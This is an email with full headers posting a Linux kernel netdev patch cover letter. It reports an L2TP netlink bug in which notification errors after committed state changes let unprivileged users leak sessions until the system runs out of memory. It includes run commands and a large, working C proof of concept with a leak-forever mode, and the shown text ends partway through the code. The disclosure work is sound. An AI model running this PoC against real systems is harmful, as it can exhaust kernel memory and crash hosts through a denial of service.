Received: from mail-pg1-f175.google.com (mail-pg1-f175.google.com [209.85.215.175])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6ADEC37FF61
	for <netdev@vger.kernel.org>; Thu, 20 Aug 2026 18:41:23 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.175
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1787251286; cv=none; b=KRxMOW4PZIpEiYMBQ2/U8GfzsJqyqpIkfJC5u5P9QaX7ggBgD7nlhqvHtmeSTJFtP1xA6axzyKwFxXI6e2LyrC1uLYUNI2R9b+DzKwgP1Qq9Q31Did72rj1zCjnlrbnYdcioYWSLpK9t8Ta+llgYCc2NOeprR/z7tQNzdBydSYU=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1787251286; c=relaxed/simple;
	bh=JPGbr95JdZFJEoVfpICmVLDRddWDvz7upBx+Zv0/bhk=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=LAtLpgj+odXqbdhbl6psAU5FryNFZvsZ+8cZZt3zUIuDsR5hUW/WxBxSxV+qecARudKgIr8uT1AujACyL6Hh6naayxFxuR+qNi4W8nhUGWYoA2H1by0dOAfEepbFUbcgTfAd7mtyGpEQnlfE3elGXkpxpbNqjm1mpON001W3puM=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=c/PkfEDz; arc=none smtp.client-ip=209.85.215.175
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="c/PkfEDz"
Received: by mail-pg1-f175.google.com with SMTP id 41be03b00d2f7-cbedda4c154so132080a12.1
        for <netdev@vger.kernel.org>; Thu, 20 Aug 2026 11:41:23 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1787251283; x=1787856083; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=E2aVuvHxzL6CxfYZp5vtM5euYf7tJ17eKFWkw0H0JeQ=;
        b=c/PkfEDzAmTQ5HqxLj7Ms+Y2Y/xK2uKwlsOPrj9AxVUuIrycVfuEWt89BPJXxpZ+uy
         uIo2UcGflsNxfPTTjv9qJGL96RMDK9xnWk96giCBJYBWMTf3i6fTPvZK7Vwsh3iCrEj7
         niK7VaGyigeV/c+6zoYpRhFr4AOMmou5mt0PAJyyWgRENVHMoFa3f+zastsT3z4vpmyC
         m7Vt65i3AxHKTmilSC04jE6OHSHXGKpHRxv4j0WQZErNKAXrp6wRK3lQCoV+tpXNWQ5o
         taCv7yvbSf/QGRpR0KAC59h/6fOX5IYbflEJwQIh5jDDRPg+sJtzXsIzHORpCMt8hLVd
         0K+w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1787251283; x=1787856083;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=E2aVuvHxzL6CxfYZp5vtM5euYf7tJ17eKFWkw0H0JeQ=;
        b=HuK/SyQpp5MQS+NtGN/QCafduBNz3xusZSlw9AA0P/vxB/bz4ga03s3rn9NjKId9kb
         AZ3bHULV7ca3Mzs8UFqjY/QlyAiMOPbCe0QbYeAnlIjK+aMpbeVTtTkyY0dUOgudASgq
         gofJfx6t+ZBRvvoAH+6j9+ZyZ0R2pY5jNNQ/l4FvnFyK19e9JB19L5KiTDsHAIxTD6CO
         BWpu7tysiZOMUCE98UBMLjiR8OojUaUc8srbSk1lrS5RQ1ZwFn7cp+DkYuRul61HZeGs
         InX/pfqEjbjg9tC08pkkloYUypvhbO4adABEpSNi8Caxtz7CzXZnp4qtHsJ5esCQNK38
         i7/w==
X-Gm-Message-State: AFuF++nnAO6byHPIkPxhw5iROLRGi7ZPaVi+sqv9fAdCDjovoEvxzcCH
	Nk6arGp4k2qckAV1TURJ95EeluHNuFQ7BbeqOp3oE2cMdtmToR6EpVh9G/ZFRotCBBPaQMIoi7D
	5Qatq9pNAGZI=
X-Gm-Gg: AR+sD10rvXVCf6zHSy0QRNFHnPKU+6j52Qi8ixSPlgMuhpUj6TVMNBXsmCJp9WkZHWN
	aLEXRx/LfK7hsmr2/3Vd1JvvB1ko5esFUaY/egJFhsf8kEcHoWz4keXee8BpE0V7eDhEbxp2Z7T
	qVn23PdGEHih7OoZcZYTwClVgwMU02C7ahqdyLvA15bEfWnO8IgImQ2Ma8ZhxOxiySG2copW6Hg
	PrbgLh7LGbulQxPb0Pvm3qytiCg0NpiXTkfSQRLfq4xOZ3j9vlzIlKANfBrJOoGHmPcuEKwxhQW
	VuPHBy+GxZ2SS0M/x9pT7fIMwa0MpV3lku7rS8CgOS0KQbmmxwZWy/f4FZw4q9URuTgdH/C46g7
	IEA9Wln5JBE/vsxfeWTHxhyRTIIsR39lpHDJG2bc+6f0msqJF1xHcSdsOkG+srl/AIp2AgMoXhk
	OQvY505+ObT2nFBjt9tV0VxX9tamwp3zGd0rt59loxBbsDyBU/5D3D00xCfvhhNJFq2iwemdRlj
	UAcHT7vJnyvIuw=
X-Received: by 2002:a17:90b:528f:b0:380:f85c:94b4 with SMTP id 98e67ed59e1d1-395c35636acmr1027234a91.7.1787251282142;
        Thu, 20 Aug 2026 11:41:22 -0700 (PDT)
Received: from gmail.com ([115.192.250.163])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-395c46b88e9sm20142a91.7.2026.08.20.11.41.10
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 20 Aug 2026 11:41:14 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org
Cc: davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	Zihan Xi <zihanx@nebusec.ai>
Subject: [PATCH net v2 0/1] net: l2tp: do not propagate multicast notification errors
Date: Thu, 20 Aug 2026 18:40:27 +0000
Message-ID: <cover.1787247008.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable

Hi Linux kernel maintainers,

We found and validated a issue in net/l2tp/l2tp_netlink.c. The bug is reach=
able by a
non-root user via user and net namespace.
The failure is observed on the unpatched kernel, not theoretical: the origi=
nal PoC
returned ENOBUFS after publishing live objects and then accumulated session=
s.
Here, that reachability statement refers to the finite state-commit trigger;
the OOM transcript below is a separate root initramfs leak-mode run (UID 0,
PID 1) used to make the leak and panic deterministic.
We've tested it, and it should not affect any other functionality.
Regression coverage includes the root namespace and an unprivileged user/ne=
t=0D
namespace, with notification-queue pressure and successful ACK paths for al=
l=0D
three state-changing PoC commands; tunnel_modify was reviewed as a=0D
notification-only command path but was not a separate PoC trigger.=0D
No broader regression suite was run.
The finite fixed-kernel runs returned ACK success for all three state-chang=
ing=0D
PoC commands in both namespaces. The leak run returned ENOBUFS and reached =
OOM=0D
after 41984 hidden Ethernet sessions.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

The tunnel create, session create, and session modify generic-netlink handl=
ers
update live L2TP state before sending their multicast notifications. The
l2tp_tunnel_notify() and l2tp_session_notify() helpers can return -ENOBUFS
when a subscribed listener has a full receive queue and NETLINK_BROADCAST_E=
RROR
is enabled. The helpers can also fail while allocating or encoding the
notification message. The handlers previously assigned any such best-effort
notification result to the command return value after the state change had
already taken effect. This produced a failure response for an operation tha=
t had
committed, allowing retries to accumulate live Ethernet sessions and netdev=
ices
while the committed tunnel remained live.

The fix keeps sending the notifications but ignores their best-effort result
in the three state-changing handlers. It also makes tunnel_modify follow the
same rule; that handler has no state rollback to perform, and its command r=
esult
must not expose a listener-side notification failure.

The PoC accepts either ENOBUFS or success from session_modify and verifies =
the
post-modify state in both cases; it reports the actual return value.

The underlying notification return-value coupling was introduced by the com=
mit
listed in Fixes:. Later changes may broaden the trigger surface, but the
root-cause fact is the overwrite of a committed command result by a best-ef=
fort
multicast notification error.

This is observed on the unpatched 7.2.0-rc7+ #1 image with
`/poc-original --leak-forever`; the relevant output was:

    [+] tunnel_create returned ENOBUFS at tunnel_id=3D1040
    [+] hidden tunnel is live: tunnel_id=3D1040 peer=3D500040 udp=3D10009/4=
0009
    [+] session_create returned ENOBUFS at session_id=3D1000032 ifname=3Dpw=
1000032
    [+] hidden session is live: tunnel=3D1040 session=3D1000032 ifname=3Dpw=
1000032 recv_seq=3D0 send_seq=3D0 lns_mode=3D0
    [+] session_modify returned ENOBUFS as expected
    [+] post-modify session state: recv_seq=3D1 send_seq=3D1 lns_mode=3D1
    [+] leaked 41984 hidden Ethernet sessions so far

Reproducer:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

The finite command above verifies the committed-state behavior. The OOM
crash log below was produced by the leak mode in the QEMU initramfs:

    /poc-original --leak-forever

The initramfs opens /proc/sys/vm/panic_on_oom and writes "2\n" before
execve() when the sysctl is available. The panic message below confirms that
panic_on_oom=3D2 was active; the exact init source is included below.

------BEGIN Makefile------
CC ?=3D gcc
CFLAGS ?=3D -O2 -Wall -Wextra

all: poc

poc: poc.c
	$(CC) $(CFLAGS) poc.c -o poc

clean:
	rm -f poc
------END Makefile--------

------BEGIN poc.sh------
#!/bin/sh
set -eu

DIR=3D$(CDPATH=3D cd -- "$(dirname -- "$0")" && pwd)
RUN_IN_USERNS=3D0
POC_ARG=3D

if [ "${1-}" =3D "--namespace" ]; then
	RUN_IN_USERNS=3D1
	shift
fi

if [ "$#" -gt 1 ]; then
	echo "usage: $0 [--namespace] [--leak-forever]" >&2
	exit 1
fi

if [ "$#" -eq 1 ]; then
	POC_ARG=3D" $1"
fi

cd "$DIR"
make

if [ "$RUN_IN_USERNS" -eq 1 ]; then
	exec unshare -Urn sh -exc "ip link set lo up; cd '$DIR'; ./poc$POC_ARG"
fi

ip link set lo up >/dev/null 2>&1 || true
exec ./poc "$@"
------END poc.sh--------

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <inttypes.h>
#include <linux/genetlink.h>
#include <linux/l2tp.h>
#include <linux/netlink.h>
#include <net/if.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef SOL_NETLINK
#define SOL_NETLINK 270
#endif

#ifndef NLA_ALIGNTO
#define NLA_ALIGNTO 4
#endif

#ifndef NLA_ALIGN
#define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
#endif

#ifndef NLA_HDRLEN
#define NLA_HDRLEN ((int) NLA_ALIGN(sizeof(struct nlattr)))
#endif

#ifndef NLA_DATA
#define NLA_DATA(na) ((void *)((char *)(na) + NLA_HDRLEN))
#endif

#ifndef NLA_NEXT
#define NLA_NEXT(na, attrlen) \
	((attrlen) -=3D NLA_ALIGN((na)->nla_len), \
	 (struct nlattr *)(((char *)(na)) + NLA_ALIGN((na)->nla_len)))
#endif

#ifndef NLA_OK
#define NLA_OK(na, len) \
	((len) >=3D (int)sizeof(struct nlattr) && \
	 (na)->nla_len >=3D sizeof(struct nlattr) && \
	 (na)->nla_len <=3D (len))
#endif

#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
#define MAX_BUF 8192
#define CTRL_BUF 4096

struct nl_socket {
	int fd;
	uint32_t portid;
	uint32_t seq;
};

struct l2tp_family {
	uint16_t family_id;
	uint32_t mcgrp_id;
};

struct tunnel_info {
	uint32_t tunnel_id;
	uint32_t peer_tunnel_id;
	uint16_t udp_sport;
	uint16_t udp_dport;
};

struct session_info {
	uint32_t tunnel_id;
	uint32_t session_id;
	uint32_t peer_session_id;
	uint8_t recv_seq;
	uint8_t send_seq;
	uint8_t lns_mode;
	char ifname[IFNAMSIZ];
};

static void die_ret(const char *what, int ret)
{
	fprintf(stderr, "%s: %s (%d)\n", what, strerror(-ret), ret);
	exit(EXIT_FAILURE);
}

static int nl_open(struct nl_socket *sock)
{
	struct sockaddr_nl addr =3D {0};
	struct timeval tv =3D {
		.tv_sec =3D 3,
		.tv_usec =3D 0,
	};
	socklen_t addrlen =3D sizeof(addr);

	sock->fd =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
	if (sock->fd < 0)
		return -errno;

	addr.nl_family =3D AF_NETLINK;
	if (bind(sock->fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		return -errno;

	if (getsockname(sock->fd, (struct sockaddr *)&addr, &addrlen) < 0)
		return -errno;

	if (setsockopt(sock->fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0)
		return -errno;

	sock->portid =3D addr.nl_pid;
	sock->seq =3D 1;
	return 0;
}

static void nl_close(struct nl_socket *sock)
{
	if (sock->fd >=3D 0)
		close(sock->fd);
	sock->fd =3D -1;
}

static int nla_put_raw(char *buf, size_t buflen, size_t *offset, uint16_t t=
ype,
		       const void *data, size_t len)
{
	struct nlattr *nla;
	size_t total =3D NLA_HDRLEN + len;
	size_t aligned =3D NLA_ALIGN(total);

	if (*offset + aligned > buflen)
		return -ENOSPC;

	nla =3D (struct nlattr *)(buf + *offset);
	nla->nla_type =3D type;
	nla->nla_len =3D total;
	memcpy(NLA_DATA(nla), data, len);
	if (aligned > total)
		memset(buf + *offset + total, 0, aligned - total);
	*offset +=3D aligned;
	return 0;
}

static int nla_put_u8(char *buf, size_t buflen, size_t *offset, uint16_t ty=
pe, uint8_t value)
{
	return nla_put_raw(buf, buflen, offset, type, &value, sizeof(value));
}

static int nla_put_u16(char *buf, size_t buflen, size_t *offset, uint16_t t=
ype, uint16_t value)
{
	return nla_put_raw(buf, buflen, offset, type, &value, sizeof(value));
}

static int nla_put_u32(char *buf, size_t buflen, size_t *offset, uint16_t t=
ype, uint32_t value)
{
	return nla_put_raw(buf, buflen, offset, type, &value, sizeof(value));
}

static int nla_put_string(char *buf, size_t buflen, size_t *offset, uint16_=
t type,
			  const char *value)
{
	return nla_put_raw(buf, buflen, offset, type, value, strlen(value) + 1);
}

static int nl_send(struct nl_socket *sock, const void *buf, size_t len)
{
	struct sockaddr_nl dst =3D {
		.nl_family =3D AF_NETLINK,
	};
	struct iovec iov =3D {
		.iov_base =3D (void *)buf,
		.iov_len =3D len,
	};
	struct msghdr msg =3D {
		.msg_name =3D &dst,
		.msg_namelen =3D sizeof(dst),
		.msg_iov =3D &iov,
		.msg_iovlen =3D 1,
	};

	if (sendmsg(sock->fd, &msg, 0) < 0)
		return -errno;
	return 0;
}

static int nl_recv(struct nl_socket *sock, char *buf, size_t buflen, ssize_=
t *out_len)
{
	ssize_t len;

	len =3D recv(sock->fd, buf, buflen, 0);
	if (len < 0)
		return -errno;
	*out_len =3D len;
	return 0;
}

static int nl_wait_ack(struct nl_socket *sock, uint32_t seq)
{
	char buf[MAX_BUF];
	ssize_t len;
	struct nlmsghdr *nlh;
	int ret;

	ret =3D nl_recv(sock, buf, sizeof(buf), &len);
	if (ret < 0)
		return ret;

	nlh =3D (struct nlmsghdr *)buf;
	if (nlh->nlmsg_seq !=3D seq)
		return -EPROTO;

	if (nlh->nlmsg_type !=3D NLMSG_ERROR)
		return -EPROTO;

	return ((struct nlmsgerr *)NLMSG_DATA(nlh))->error;
}

static int nl_request_reply(struct nl_socket *sock, void *req, size_t req_l=
en,
			    uint32_t seq, char *reply, size_t reply_len,
			    ssize_t *reply_size)
{
	struct nlmsghdr *nlh;
	int ret;

	ret =3D nl_send(sock, req, req_len);
	if (ret < 0)
		return ret;

	ret =3D nl_recv(sock, reply, reply_len, reply_size);
	if (ret < 0)
		return ret;

	nlh =3D (struct nlmsghdr *)reply;
	if (nlh->nlmsg_seq !=3D seq)
		return -EPROTO;

	if (nlh->nlmsg_type =3D=3D NLMSG_ERROR)
		return ((struct nlmsgerr *)NLMSG_DATA(nlh))->error;

	return 0;
}

static uint16_t nla_get_u16(const struct nlattr *nla)
{
	uint16_t value;

	memcpy(&value, NLA_DATA(nla), sizeof(value));
	return value;
}

static uint32_t nla_get_u32(const struct nlattr *nla)
{
	uint32_t value;

	memcpy(&value, NLA_DATA(nla), sizeof(value));
	return value;
}

static uint8_t nla_get_u8(const struct nlattr *nla)
{
	uint8_t value;

	memcpy(&value, NLA_DATA(nla), sizeof(value));
	return value;
}

static int resolve_l2tp_family(struct nl_socket *sock, struct l2tp_family *=
family)
{
	char req[CTRL_BUF] =3D {0};
	char reply[CTRL_BUF];
	struct nlmsghdr *nlh =3D (struct nlmsghdr *)req;
	struct genlmsghdr *genlh =3D (struct genlmsghdr *)(req + NLMSG_HDRLEN);
	struct nlattr *nla;
	size_t offset =3D NLMSG_HDRLEN + GENL_HDRLEN;
	ssize_t reply_len;
	uint32_t seq =3D sock->seq++;
	int rem;
	int ret;

	nlh->nlmsg_len =3D offset;
	nlh->nlmsg_type =3D GENL_ID_CTRL;
	nlh->nlmsg_flags =3D NLM_F_REQUEST;
	nlh->nlmsg_seq =3D seq;

	genlh->cmd =3D CTRL_CMD_GETFAMILY;
	genlh->version =3D 1;

	ret =3D nla_put_string(req, sizeof(req), &offset, CTRL_ATTR_FAMILY_NAME,
			     L2TP_GENL_NAME);
	if (ret < 0)
		return ret;
	nlh->nlmsg_len =3D offset;

	ret =3D nl_request_reply(sock, req, nlh->nlmsg_len, seq, reply, sizeof(rep=
ly),
			       &reply_len);
	if (ret < 0)
		return ret;

	memset(family, 0, sizeof(*family));

	nlh =3D (struct nlmsghdr *)reply;
	genlh =3D (struct genlmsghdr *)(reply + NLMSG_HDRLEN);
	nla =3D (struct nlattr *)((char *)genlh + GENL_HDRLEN);
	rem =3D nlh->nlmsg_len - NLMSG_HDRLEN - GENL_HDRLEN;

	for (; NLA_OK(nla, rem); nla =3D NLA_NEXT(nla, rem)) {
		if (nla->nla_type =3D=3D CTRL_ATTR_FAMILY_ID) {
			family->family_id =3D nla_get_u16(nla);
			continue;
		}
		if (nla->nla_type =3D=3D CTRL_ATTR_MCAST_GROUPS) {
			struct nlattr *grp =3D (struct nlattr *)NLA_DATA(nla);
			int grem =3D nla->nla_len - NLA_HDRLEN;

			for (; NLA_OK(grp, grem); grp =3D NLA_NEXT(grp, grem)) {
				struct nlattr *entry =3D (struct nlattr *)NLA_DATA(grp);
				int erem =3D grp->nla_len - NLA_HDRLEN;
				const char *name =3D NULL;
				uint32_t id =3D 0;

				for (; NLA_OK(entry, erem); entry =3D NLA_NEXT(entry, erem)) {
					if (entry->nla_type =3D=3D CTRL_ATTR_MCAST_GRP_NAME)
						name =3D (const char *)NLA_DATA(entry);
					else if (entry->nla_type =3D=3D CTRL_ATTR_MCAST_GRP_ID)
						id =3D nla_get_u32(entry);
				}

				if (name && strcmp(name, L2TP_GENL_MCGROUP) =3D=3D 0)
					family->mcgrp_id =3D id;
			}
		}
	}

	if (!family->family_id || !family->mcgrp_id)
		return -ENOENT;
	return 0;
}

static int blocker_setup(struct nl_socket *sock, uint32_t mcgrp_id)
{
	int one =3D 1;
	int rcvbuf =3D 4096;

	if (setsockopt(sock->fd, SOL_NETLINK, NETLINK_BROADCAST_ERROR,
		       &one, sizeof(one)) < 0)
		return -errno;
	if (setsockopt(sock->fd, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf)) <=
 0)
		return -errno;
	if (setsockopt(sock->fd, SOL_NETLINK, NETLINK_ADD_MEMBERSHIP,
		       &mcgrp_id, sizeof(mcgrp_id)) < 0)
		return -errno;
	return 0;
}

static int l2tp_tunnel_create(struct nl_socket *sock, uint16_t family_id,
			      uint32_t tunnel_id, uint32_t peer_tunnel_id,
			      uint16_t udp_sport, uint16_t udp_dport)
{
	char req[MAX_BUF] =3D {0};
	struct nlmsghdr *nlh =3D (struct nlmsghdr *)req;
	struct genlmsghdr *genlh =3D (struct genlmsghdr *)(req + NLMSG_HDRLEN);
	size_t offset =3D NLMSG_HDRLEN + GENL_HDRLEN;
	uint32_t seq =3D sock->seq++;
	int ret;

	nlh->nlmsg_len =3D offset;
	nlh->nlmsg_type =3D family_id;
	nlh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq =3D seq;

	genlh->cmd =3D L2TP_CMD_TUNNEL_CREATE;
	genlh->version =3D L2TP_GENL_VERSION;

	ret =3D nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_CONN_ID, tunnel_i=
d);
	ret =3D ret ?: nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_PEER_CONN_=
ID,
				 peer_tunnel_id);
	ret =3D ret ?: nla_put_u8(req, sizeof(req), &offset, L2TP_ATTR_PROTO_VERSI=
ON, 3);
	ret =3D ret ?: nla_put_u16(req, sizeof(req), &offset, L2TP_ATTR_ENCAP_TYPE,
				 L2TP_ENCAPTYPE_UDP);
	ret =3D ret ?: nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_IP_SADDR,
				 inet_addr("127.0.0.1"));
	ret =3D ret ?: nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_IP_DADDR,
				 inet_addr("127.0.0.1"));
	ret =3D ret ?: nla_put_u16(req, sizeof(req), &offset, L2TP_ATTR_UDP_SPORT,
				 udp_sport);
	ret =3D ret ?: nla_put_u16(req, sizeof(req), &offset, L2TP_ATTR_UDP_DPORT,
				 udp_dport);
	if (ret < 0)
		return ret;

	nlh->nlmsg_len =3D offset;
	ret =3D nl_send(sock, req, nlh->nlmsg_len);
	if (ret < 0)
		return ret;
	return nl_wait_ack(sock, seq);
}

static int l2tp_tunnel_get(struct nl_socket *sock, uint16_t family_id,
			   uint32_t tunnel_id, struct tunnel_info *info)
{
	char req[MAX_BUF] =3D {0};
	char reply[MAX_BUF];
	struct nlmsghdr *nlh =3D (struct nlmsghdr *)req;
	struct genlmsghdr *genlh =3D (struct genlmsghdr *)(req + NLMSG_HDRLEN);
	struct nlattr *nla;
	size_t offset =3D NLMSG_HDRLEN + GENL_HDRLEN;
	ssize_t reply_len;
	uint32_t seq =3D sock->seq++;
	int rem;
	int ret;

	nlh->nlmsg_len =3D offset;
	nlh->nlmsg_type =3D family_id;
	nlh->nlmsg_flags =3D NLM_F_REQUEST;
	nlh->nlmsg_seq =3D seq;

	genlh->cmd =3D L2TP_CMD_TUNNEL_GET;
	genlh->version =3D L2TP_GENL_VERSION;

	ret =3D nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_CONN_ID, tunnel_i=
d);
	if (ret < 0)
		return ret;
	nlh->nlmsg_len =3D offset;

	ret =3D nl_request_reply(sock, req, nlh->nlmsg_len, seq, reply, sizeof(rep=
ly),
			       &reply_len);
	if (ret < 0)
		return ret;

	memset(info, 0, sizeof(*info));
	nlh =3D (struct nlmsghdr *)reply;
	genlh =3D (struct genlmsghdr *)(reply + NLMSG_HDRLEN);
	nla =3D (struct nlattr *)((char *)genlh + GENL_HDRLEN);
	rem =3D nlh->nlmsg_len - NLMSG_HDRLEN - GENL_HDRLEN;

	for (; NLA_OK(nla, rem); nla =3D NLA_NEXT(nla, rem)) {
		switch (nla->nla_type) {
		case L2TP_ATTR_CONN_ID:
			info->tunnel_id =3D nla_get_u32(nla);
			break;
		case L2TP_ATTR_PEER_CONN_ID:
			info->peer_tunnel_id =3D nla_get_u32(nla);
			break;
		case L2TP_ATTR_UDP_SPORT:
			info->udp_sport =3D nla_get_u16(nla);
			break;
		case L2TP_ATTR_UDP_DPORT:
			info->udp_dport =3D nla_get_u16(nla);
			break;
		default:
			break;
		}
	}

	if (info->tunnel_id !=3D tunnel_id)
		return -ENOENT;
	return 0;
}

static int l2tp_session_create(struct nl_socket *sock, uint16_t family_id,
			       uint32_t tunnel_id, uint32_t session_id,
			       uint32_t peer_session_id, const char *ifname)
{
	char req[MAX_BUF] =3D {0};
	struct nlmsghdr *nlh =3D (struct nlmsghdr *)req;
	struct genlmsghdr *genlh =3D (struct genlmsghdr *)(req + NLMSG_HDRLEN);
	size_t offset =3D NLMSG_HDRLEN + GENL_HDRLEN;
	uint32_t seq =3D sock->seq++;
	int ret;

	nlh->nlmsg_len =3D offset;
	nlh->nlmsg_type =3D family_id;
	nlh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq =3D seq;

	genlh->cmd =3D L2TP_CMD_SESSION_CREATE;
	genlh->version =3D L2TP_GENL_VERSION;

	ret =3D nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_CONN_ID, tunnel_i=
d);
	ret =3D ret ?: nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_SESSION_ID,
				 session_id);
	ret =3D ret ?: nla_put_u32(req, sizeof(req), &offset,
				 L2TP_ATTR_PEER_SESSION_ID, peer_session_id);
	ret =3D ret ?: nla_put_u16(req, sizeof(req), &offset, L2TP_ATTR_PW_TYPE,
				 L2TP_PWTYPE_ETH);
	ret =3D ret ?: nla_put_string(req, sizeof(req), &offset, L2TP_ATTR_IFNAME,
				    ifname);
	if (ret < 0)
		return ret;

	nlh->nlmsg_len =3D offset;
	ret =3D nl_send(sock, req, nlh->nlmsg_len);
	if (ret < 0)
		return ret;
	return nl_wait_ack(sock, seq);
}

static int l2tp_session_get(struct nl_socket *sock, uint16_t family_id,
			    uint32_t tunnel_id, uint32_t session_id,
			    struct session_info *info)
{
	char req[MAX_BUF] =3D {0};
	char reply[MAX_BUF];
	struct nlmsghdr *nlh =3D (struct nlmsghdr *)req;
	struct genlmsghdr *genlh =3D (struct genlmsghdr *)(req + NLMSG_HDRLEN);
	struct nlattr *nla;
	size_t offset =3D NLMSG_HDRLEN + GENL_HDRLEN;
	ssize_t reply_len;
	uint32_t seq =3D sock->seq++;
	int rem;
	int ret;

	nlh->nlmsg_len =3D offset;
	nlh->nlmsg_type =3D family_id;
	nlh->nlmsg_flags =3D NLM_F_REQUEST;
	nlh->nlmsg_seq =3D seq;

	genlh->cmd =3D L2TP_CMD_SESSION_GET;
	genlh->version =3D L2TP_GENL_VERSION;

	ret =3D nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_CONN_ID, tunnel_i=
d);
	ret =3D ret ?: nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_SESSION_ID,
				 session_id);
	if (ret < 0)
		return ret;
	nlh->nlmsg_len =3D offset;

	ret =3D nl_request_reply(sock, req, nlh->nlmsg_len, seq, reply, sizeof(rep=
ly),
			       &reply_len);
	if (ret < 0)
		return ret;

	memset(info, 0, sizeof(*info));
	nlh =3D (struct nlmsghdr *)reply;
	genlh =3D (struct genlmsghdr *)(reply + NLMSG_HDRLEN);
	nla =3D (struct nlattr *)((char *)genlh + GENL_HDRLEN);
	rem =3D nlh->nlmsg_len - NLMSG_HDRLEN - GENL_HDRLEN;

	for (; NLA_OK(nla, rem); nla =3D NLA_NEXT(nla, rem)) {
		switch (nla->nla_type) {
		case L2TP_ATTR_CONN_ID:
			info->tunnel_id =3D nla_get_u32(nla);
			break;
		case L2TP_ATTR_SESSION_ID:
			info->session_id =3D nla_get_u32(nla);
			break;
		case L2TP_ATTR_PEER_SESSION_ID:
			info->peer_session_id =3D nla_get_u32(nla);
			break;
		case L2TP_ATTR_RECV_SEQ:
			info->recv_seq =3D nla_get_u8(nla);
			break;
		case L2TP_ATTR_SEND_SEQ:
			info->send_seq =3D nla_get_u8(nla);
			break;
		case L2TP_ATTR_LNS_MODE:
			info->lns_mode =3D nla_get_u8(nla);
			break;
		case L2TP_ATTR_IFNAME:
			snprintf(info->ifname, sizeof(info->ifname), "%s",
				 (const char *)NLA_DATA(nla));
			break;
		default:
			break;
		}
	}

	if (info->session_id !=3D session_id || info->tunnel_id !=3D tunnel_id)
		return -ENOENT;
	return 0;
}

static int l2tp_session_modify(struct nl_socket *sock, uint16_t family_id,
			       uint32_t tunnel_id, uint32_t session_id)
{
	char req[MAX_BUF] =3D {0};
	struct nlmsghdr *nlh =3D (struct nlmsghdr *)req;
	struct genlmsghdr *genlh =3D (struct genlmsghdr *)(req + NLMSG_HDRLEN);
	size_t offset =3D NLMSG_HDRLEN + GENL_HDRLEN;
	uint32_t seq =3D sock->seq++;
	int ret;

	nlh->nlmsg_len =3D offset;
	nlh->nlmsg_type =3D family_id;
	nlh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq =3D seq;

	genlh->cmd =3D L2TP_CMD_SESSION_MODIFY;
	genlh->version =3D L2TP_GENL_VERSION;

	ret =3D nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_CONN_ID, tunnel_i=
d);
